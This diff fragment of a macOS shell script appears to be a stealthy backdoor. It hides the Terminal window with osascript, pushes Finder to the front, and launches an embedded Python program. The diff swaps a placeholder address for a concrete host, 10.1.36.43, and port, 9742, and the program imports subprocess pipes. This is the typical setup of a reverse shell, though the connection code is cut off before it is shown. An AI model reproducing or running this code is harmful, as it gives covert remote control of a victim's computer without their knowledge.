@@ -2,14 +2,11 @@
 osascript -e "tell application \"Finder\" to activate";
 osascript -e "tell application \"Terminal\" to set visible of window 1 to false";
 
-FILE_NAME=$0;
-
 sh -c '
 #killall Terminal;
 
-
 python3 -c "
-HOST,PORT=\"0.0.0.0\",\"0\"
+HOST,PORT=\"10.1.36.43\",\"9742\"
 from subprocess import run, Popen, PIPE
 from time import sleep
 import os
